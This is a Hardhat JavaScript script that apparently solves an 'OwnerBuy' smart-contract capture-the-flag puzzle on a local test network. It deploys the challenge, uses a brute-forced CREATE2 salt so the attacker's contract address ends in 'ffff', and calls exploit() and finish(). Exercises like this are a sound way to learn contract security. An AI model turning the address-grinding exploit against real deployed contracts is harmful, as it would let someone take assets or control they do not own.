const { ethers } = require("hardhat");

async function deploy(deployer) {
  const OwnerBuy = await ethers.getContractFactory("OwnerBuy", deployer);
  const ownerBuy = await OwnerBuy.deploy();
  console.log("OwnerBuy contract:", ownerBuy.address);

  return ownerBuy;
}
async function byte32(i) {
  const amount = ethers.BigNumber.from(i);
  return ethers.utils.hexZeroPad(amount.toHexString(), 32);
}
async function exploit(attacker, target) {
  const OwnerBuySolution = await ethers.getContractFactory(
    "OwnerBuySolution",
    attacker
  );
  const Creat2 = await ethers.getContractFactory("Creat2", attacker);
  const creat2 = await Creat2.deploy();
  // let i=0
  // while(1){
  //     let address=await creat2.connect(attacker).getAddress(byte32(i))
  //     if(address.substr(-4, 4).toLowerCase()=="ffff"){
  //
  //         break
  //     }
  //     i+=1;
  //     console.log(i)
  // }
  // i=55833
  await creat2.connect(attacker).deploy(byte32(55833), { value: 1000 });
  let ownerBuySolution_address = await creat2.ownerBuySolution();
  console.log("Solution contract:", ownerBuySolution_address);
  let solution = await OwnerBuySolution.attach(ownerBuySolution_address);
  try {
    await solution.connect(attacker).finish();
  } catch (error) {
    console.log("Before: finish():", error.toString());
  }

  await solution.connect(attacker).exploit();
  console.log("After: finish():", await solution.connect(attacker).finish());
}

async function main() {
  let [deployer, attacker] = await ethers.getSigners();
  let ownerBuy = await deploy(deployer);

  await exploit(attacker, ownerBuy);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
